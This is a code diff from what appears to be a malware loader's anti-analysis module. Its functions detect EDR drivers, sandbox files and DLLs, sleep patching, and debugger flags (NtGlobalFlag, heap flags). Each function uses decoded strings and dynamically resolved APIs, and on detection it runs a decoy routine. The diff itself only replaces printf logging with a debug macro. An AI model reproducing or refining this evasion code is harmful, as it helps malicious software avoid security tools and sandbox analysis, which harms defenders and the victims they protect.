@@ -51,7 +51,7 @@ bool DetS()
                 continue;
             if (StrStrIA(findFileData.cFileName, decodedDriver))
             {
-                printf("[!] Detected EDR: %s\n", decodedDriver);
+                myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
                 SortNumbers();
                 return true;
             }
@@ -76,7 +76,7 @@ bool DetSl()
 
     if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
     {
-        printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
+        myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
         SortNumbers();
         return true;
     }
@@ -120,7 +120,7 @@ bool DetSBF()
 
         if (pPathFileExistsA(decodedPath))
         {
-            printf("[!] Sandbox file detected!\n");
+            myDebug(DEBUG_INFO, "Sandbox file detected!");
             SortNumbers();
             free(decodedPath);
             return true;
@@ -254,7 +254,7 @@ bool DetSBD()
         HMODULE lib_inst = (HMODULE)pLoadLibraryA(decodedPath);
         if (lib_inst == NULL)
         {
-            printf("Checks : %s\n", decodedPath);
+            myDebug(DEBUG_INFO, "Checks : %s", decodedPath);
             free(decodedPath);
             SortNumbers();
             return true;
@@ -269,7 +269,7 @@ bool DetSBD()
         HMODULE lib_inst = (HMODULE)pGetModuleHandleA(decodedPath);
         if (lib_inst != NULL)
         {
-            printf("Checks : %s\n", decodedPath);
+            printf("Checks : %s", decodedPath);
             free(decodedPath);
             SortNumbers();
             return true;
@@ -325,31 +325,31 @@ bool DetFH()
 // Main Sandbox Detection Function
 bool PerfomChecksEnv()
 {
-    printf("[*] Checking for NtGlobalFlag...\n");
+    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
     if (DetFPEB())
         return true; // avoiding further checks
 
-    printf("[*] Checking for Heap Flags...\n");
+    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
     if (DetFH())
         return true; // avoiding further checks
 
-    printf("[*] Checking for filename hash matching...\n");
+    myDebug(DEBUG_INFO, "Checking for filename hash matching...");
     if (DetF())
         return true; // avoiding further checks
 
-    printf("[*] Checking for sandbox files...\n");
+    myDebug(DEBUG_INFO, "Checking for sandbox files...");
     if (DetSBF())
         return true; // avoiding further checks
 
-    printf("[*] Checking for EDRs...\n");
+    myDebug(DEBUG_INFO, "Checking for EDRs...");
     if (DetS())
         return true; // avoiding further checks
 
-    printf("[*] Checking for sleep patching...\n");
+    myDebug(DEBUG_INFO, "Checking for sleep patching...");
     if (DetSl())
         return true; // avoiding further checks
 
-    printf("[*] Checking for dll...\n");
+    myDebug(DEBUG_INFO, "Checking for dll...");
     if (DetSBD())
         return true; // avoiding further checks
 
